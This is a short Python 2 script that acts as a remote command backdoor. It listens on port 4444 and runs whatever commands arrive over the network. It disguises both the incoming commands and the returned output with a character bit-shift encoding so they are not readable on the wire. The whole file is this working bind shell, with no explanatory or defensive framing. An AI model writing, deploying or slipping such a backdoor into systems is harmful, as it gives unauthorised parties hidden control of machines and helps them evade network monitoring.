import socket
import sys
import subprocess

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_address = ('172.16.0.201', 4444)
print >>sys.stderr,'Starting up on %s port %s' % server_address
sock.bind(server_address)

sock.listen(1)

while True:
	print >>sys.stderr, 'Waiting for connection...'
	connection,client_address = sock.accept()
	
	try:
		print >>sys.stderr, 'Connection from %s', client_address
		
		while True:
			command = ''
			data = connection.recv(1024)
			for i in data:
				tempint = ord(i) >> 1
				command += chr(tempint)
			print >> sys.stderr, 'Received "%s"' % data
			if data:
				command = command.strip()
				print command
				output = subprocess.check_output(command.split())	
				ret_mesg = ''
				for i in output:
					tempint = ord(i) << 1
					ret_mesg += chr(tempint)
				if (ret_mesg == ''):
					ret_mesg = '\n'
				connection.sendall(ret_mesg)
			else:
				print >>sys.stderr, 'No more data from %s', client_address
				break
	finally:
		connection.close()
